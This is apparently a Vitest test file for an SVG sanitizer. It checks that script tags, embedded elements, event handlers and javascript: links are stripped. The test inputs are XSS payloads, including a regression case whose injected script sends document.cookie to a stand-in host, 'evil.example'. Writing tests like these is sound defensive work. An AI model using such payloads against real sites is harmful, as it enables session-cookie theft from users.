import { describe, it, expect } from 'vitest';
import { sanitizeSvg } from '../../src/utils/svg';

const CLEAN_SVG = '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="40"/></svg>';

describe('sanitizeSvg', () => {
    describe('edge cases', () => {
        it('returns empty string for empty input', () => {
            expect(sanitizeSvg('')).toBe('');
        });

        it('returns empty string for non-SVG XML', () => {
            expect(sanitizeSvg('<html><body>hello</body></html>')).toBe('');
        });

        it('returns empty string for plain text', () => {
            expect(sanitizeSvg('not svg at all')).toBe('');
        });
    });

    describe('clean SVG', () => {
        it('passes through a safe SVG unchanged in structure', () => {
            const result = sanitizeSvg(CLEAN_SVG);
            expect(result).toContain('<svg');
            expect(result).toContain('<circle');
        });

        it('preserves safe attributes', () => {
            const result = sanitizeSvg(CLEAN_SVG);
            expect(result).toContain('cx="50"');
        });
    });

    describe('removes dangerous elements', () => {
        it('removes <script> tags', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('<script');
            expect(result).not.toContain('alert(1)');
        });

        it('removes <foreignObject> tags', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div>xss</div></foreignObject></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('foreignObject');
            expect(result).not.toContain('<div>');
        });

        it('removes <iframe> tags', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><iframe src="evil"/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('<iframe');
        });

        it('removes <object> tags', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><object data="evil"/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('<object');
        });

        it('removes <embed> tags', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><embed src="evil"/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('<embed');
        });
    });

    describe('removes event handlers', () => {
        it('removes onclick attributes', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('onclick');
        });

        it('removes onload attributes', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('onload');
        });

        it('removes onmouseover attributes', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="evil()"/></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('onmouseover');
        });

        it('removes event handlers on nested elements', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><g><rect onerror="evil()"/></g></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('onerror');
        });
    });

    describe('removes javascript: hrefs', () => {
        it('removes href="javascript:..."', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('javascript:');
        });

        it('removes href with leading whitespace before javascript:', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="  javascript:alert(1)"><rect/></a></svg>';
            const result = sanitizeSvg(svg);
            expect(result).not.toContain('javascript:');
        });

        it('preserves safe https href', () => {
            const svg = '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.com"><rect/></a></svg>';
            const result = sanitizeSvg(svg);
            expect(result).toContain('href="https://example.com"');
        });
    });

    describe('ratings logo SVG (regression)', () => {
        it('strips script from a provider logo SVG containing an injected script tag', () => {
            // Regression: r.logoSvg in the ratings badge was rendered with x-html without
            // sanitization. A compromised or malicious ratings provider could inject a script.
            const maliciousLogo = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/steal?c="+document.cookie)</script><path d="M0 0h24v24H0z"/></svg>';
            const result = sanitizeSvg(maliciousLogo);
            expect(result).not.toContain('<script');
            expect(result).not.toContain('document.cookie');
            expect(result).toContain('<path');
        });

        it('strips onload handler from a provider logo SVG', () => {
            const maliciousLogo = '<svg xmlns="http://www.w3.org/2000/svg" onload="evil()"><circle r="10"/></svg>';
            const result = sanitizeSvg(maliciousLogo);
            expect(result).not.toContain('onload');
            expect(result).toContain('<circle');
        });
    });
});
